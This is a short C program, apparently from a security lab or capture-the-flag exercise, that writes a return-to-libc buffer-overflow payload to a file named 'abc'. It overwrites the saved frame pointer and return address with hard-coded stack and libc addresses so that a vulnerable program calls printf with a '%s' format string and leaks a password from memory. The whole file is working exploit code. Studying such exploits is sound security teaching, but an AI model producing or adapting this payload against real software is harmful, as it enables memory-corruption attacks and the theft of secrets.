#include <stdio.h>
#include <string.h>

int main() {
  int i;
  unsigned char buf[128]; //must use unsigned char due to sign extension 
  FILE *fp;

  memset(buf ,'a', 128);

  *((unsigned*)(&buf[88])) = 0xffffdad8; // old ebp
  *((unsigned*)(&buf[92])) = 0xf7e25d30; // address of printf in libc (overwritten to the ture ret address)
  *((unsigned*)(&buf[96])) = 0xf7df0ee5; // fake ret address after printf is executed
  *((unsigned*)(&buf[100])) = 0xffffd97c; // 1st argument of printf (addr of format string)
  *((unsigned*)(&buf[104])) = 0xffffda0c; // 2nd argument of printf (addr of password)
  strncpy(buf+108, "%s\n", 4); // the format string "%s\n"

  fp = fopen("abc", "w");
  fwrite(buf, 1, 128, fp);

  fclose(fp);
}
